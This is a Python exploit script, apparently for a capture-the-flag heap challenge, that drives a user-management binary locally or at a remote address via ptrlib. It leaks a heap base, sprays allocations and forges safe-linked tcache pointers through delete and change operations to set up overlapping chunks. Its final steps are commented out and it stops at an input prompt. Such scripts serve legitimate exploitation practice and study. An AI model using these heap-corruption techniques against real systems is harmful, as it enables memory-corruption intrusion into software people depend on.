#!/usr/bin/env python
import ptrlib as ptr
import sys
import os

exe = ptr.ELF("./run_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")
os.system(f"killall {exe.filepath}")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def safe_link(heap_base: int, current_offset: int, dest_offset: int):
    return (heap_base + current_offset) >> 12 ^ (heap_base + dest_offset)


def main():
    io = connect()

    def restart_alt():
        io.sendlineafter("> ", "0")
        return

    def restart():
        io.sendlineafter("> ", "1")
        return

    def new(username: bytes | str, password: bytes | str):
        io.sendlineafter("> ", "2")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else:
            io.sendlineafter("username > ", username)
        if len(username) == 8:
            io.sendafter("password > ", password)
        else:
            io.sendlineafter("password > ", password)
        return

    def delete(username: bytes | str):
        io.sendlineafter("> ", "3")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else:
            io.sendlineafter("username > ", username)
        return

    def change(username: bytes | str, password: bytes | str):
        io.sendlineafter("> ", "4")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else:
            io.sendlineafter("username > ", username)
        if len(username) == 8:
            io.sendafter("password > ", password)
        else:
            io.sendlineafter("password > ", password)
        return

    def view() -> bytes:
        io.sendlineafter("> ", "5")
        return io.recvuntil("---- menu ----").strip(b"---- menu ----")

    new("A", "A" * 8)
    heap_base = ptr.u64(view().split(b"A: AAAAAAAA")[1].split(b"\nroot")[0])
    heap_base = heap_base >> 12 << 12
    ptr.logger.info(f"heap_base = {hex(heap_base)}")

    new("B", "A" * 8)
    new("C", "A" * 8)

    for _ in range(22):
        new("extend", "extend")

    # delete("A")
    delete("B")
    delete("C")
    restart()
    change("root", "new_root")
    delete("root")
    change(ptr.p64(safe_link(heap_base, 0x5a0, 0x570)), "fake_key")
    delete(ptr.p64(safe_link(heap_base, 0x5a0, 0x570)))
    # new(ptr.p64(safe_link(heap_base, 0x5a0, 0x5c0)), ptr.p64(0))
    # new("dummy", "A" * 8) 
    # new("fakesize", ptr.p64(0x421))
    # input(">>")
    # delete("A" * 8)
    input(">>")
    return


if __name__ == "__main__":
    main()
